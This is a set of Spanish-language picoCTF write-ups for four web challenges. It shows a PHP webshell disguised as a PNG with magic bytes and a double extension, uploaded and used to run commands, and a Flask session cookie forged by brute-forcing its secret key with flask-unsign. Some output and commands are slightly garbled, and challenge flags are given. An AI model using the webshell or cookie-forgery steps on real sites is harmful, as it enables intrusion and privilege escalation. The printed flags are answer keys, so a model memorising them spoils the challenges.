#  01 atchTheRegex
# DESC
How about trying to match a regular expression

Additional details will be available after launching your challenge instance.

# SOLUCION

````` python
unsamos el codigo fuente de la pagina e ingresamos picoCTF{

picoCTF{succ3ssfully_matchtheregex_8ad436ed}
````` 


#  02 SOAP
# DESC

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.
# SOLUCION
abrimos el burpsuite y la pagina del pico despues le picos a interceptar paquetes y cambiamos el payload y mandamos la respuesta 
````` python
	picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}
````` 




#  03 Trickster
# DESC

I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:62666/)!
# SOLUCION

````` python
```
nano webshell.php
```

```html
PNG //Para engañar a la aplicación
<?php
if(isset($_GET['cmd'])){
	echo "<pre>";
	system($_GET['cmd']);
	echo "</pre>";
}
?>
```

```
mv webshell.php webshell.png.php
```

Comprobamos que los magic bites sí coincidan con los de los archivos png

```
xxd webshell.png.php
```

```
00000000: 504e 470a 3c3f 7068 700a 6966 2869 7373  PNG.<?php.if(iss
00000010: 6574 2824 5f47 4554 5b27 636d 6427 5d29  et($_GET['cmd'])
00000020: 297b 0a09 6563 686f 2022 3c70 7265 3e22  ){..echo "<pre>"
00000030: 3b0a 0973 7973 7465 6d28 245f 4745 545b  ;..system($_GET[
00000040: 2763 6d64 275d 293b 0a09 6563 686f 2022  'cmd']);..echo "
00000050: 3c2f 7072 653e 223b 0a7d 0a3f 3e0a       </pre>";.}.?>.
```

5. Subimos el archivo a la aplicación
6. Vamos a la carpeta de uploads y buscamos el archivo. El archivo recibe comandos cmd y los ejecuta

```
/uploads/webshell.png.php?cmd=ls

output: 
webshell.png.php
```

```
/uploads/webshell.png.php?cmd=ls ..

output: 
HFQWKODGMIYTO.txt
index.php
instructions.txt
robots.txt
uploads
```

```
/uploads/webshell.png.php?cmd=cat ../HFQWKODGMIYTO.txt

/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17} */
```
````` 




#  04  Most Cookies

# SOLUCION

````` python
1. Ingresamos a la página
2. Accedemos con la sugerencia de ingreso y revisamos las cookies
3. Revisamos la cookie de session

```
eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-8FlQ.uE7bFv977aR24b8cziZuaRWguyg
```

4. Decodificamos la cookie

```
echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-8FlQ.uE7bFv977aR24b8cziZuaRWguyg | base64 -d

output: {"very_auth":"snickerdoodle"}base64: entrada inválida
```

5. Revisamos el código que nos proporcionaron al inicio del reto

```
wget "https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py"

cat server.py
```

6. En el código encontramos las palabras con las se puede ingresar, las copiamos y las guardamos en un diccionario para hacer un ataque de fuerza bruta

```
pluma server.py
```

```python
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

app.secret_key = random.choice(cookie_names)
```

```
cookies.txt

snickerdoodle 
chocolate chip 
oatmeal raisin 
gingersnap 
shortbread 
peanut butter 
whoopie pie 
sugar 
molasses 
kiss 
biscotti 
butter 
spritz 
snowball 
drop 
thumbprint 
pinwheel 
wafer 
macaroon 
fortune 
crinkle 
icebox 
gingerbread 
tassie 
lebkuchen 
macaron 
black and white 
white chocolate macadamia
```

7. Hacemos el ataque de fuerza bruta

```
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-9FJQ.ghYwXIIlabTut47IUr03DhReHB0" --wordlist cookies.txt
```

```
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'
```

8. Creamos la nueva cookie y la usamos para sustituir la anterior en el navegador

```
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'fortune'
```

```
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-9IHQ.xGV1Y_ykIGoEzub7P-1A5GDQyaA
```

```
curl -s http://mercury.picoctf.net:65344 -H 'Cookie: eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-9IHQ.xGV1Y_ykIGoEzub7P-1A5GDQyaA' ! grep -oE "picoCTF{.*?}"
```

9. Obtenemos la bandera

```
picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}
```
````` 




